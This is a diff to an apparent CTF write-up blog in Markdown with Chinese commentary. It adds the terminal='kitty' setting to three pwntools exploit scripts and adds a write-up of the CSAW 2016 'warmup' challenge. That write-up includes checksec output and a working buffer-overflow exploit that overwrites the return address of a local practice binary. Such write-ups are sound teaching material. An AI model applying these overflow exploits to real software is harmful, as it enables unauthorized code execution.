@@ -198,7 +198,7 @@ Thu Jul 25 05:35:00 PM CST 2024
 
 from pwn import *
 
-context(os='linux', arch='amd64', log_level='debug')
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
 
 target = process('./boi')
 
@@ -265,7 +265,7 @@ I don't know that! Auuuuuuuugh!
 
 from pwn import *
 
-context(os='linux', arch='amd64', log_level='debug')
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
 
 target = process('./pwn1')
 
@@ -376,7 +376,7 @@ Invalid Password, Try Again!
 
 from pwn import *
 
-context(os='linux', arch='amd64', log_level='debug')
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
 
 target = process('./just_do_it')
 
@@ -390,4 +390,73 @@ target.interactive()
 
 Flag: `TWCTF{pwnable_warmup_I_did_it!}`
 
+## CSAW 2016 Quals Warmup
+
+### Information
+
+ - Category: Pwn
+ - Points: 50
+
+### Description
+
+> So you want to be a pwn-er huh? Well let's throw you an easy one ;)
+
+<Download name="warmup" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw16_warmup/warmup" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file warmup
+warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
+λ ~/ pwn checksec warmup
+[*] '/home/cub3y0nd/warmup'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+```plain-text
+λ ~/ ./warmup
+-Warm Up-
+WOW:0x40060d
+>wow
+```
+
+<center>
+  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/28/pkqh8T1.png" width={1920} height={1080} />
+</center>
+
+这种题真就是闭着眼睛做... 一眼出思路：溢出 `v5` 覆盖返回地址为 `easy` 函数即可。
+
+值得注意的是首先要了解函数调用约定和栈帧布局，这样才能准确的覆盖返回地址。可以参考下面两篇文章：
+
+ - [C 语言函数调用栈（一）](http://www.cnblogs.com/clover-toeic/p/3755401.html)
+ - [C 语言函数调用栈（二）](http://www.cnblogs.com/clover-toeic/p/3756668.html)
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
+
+target = process('./warmup')
+
+gdb.attach(target, 'b *main+135')
+pause()
+
+payload = b'A' * (64 + 8) + p64(0x40060d)
+
+target.sendline(payload)
+pause()
+target.interactive()
+```
+
+### Flag
+
+Flag: `FLAG{LET_US_BEGIN_CSAW_2016}`
 
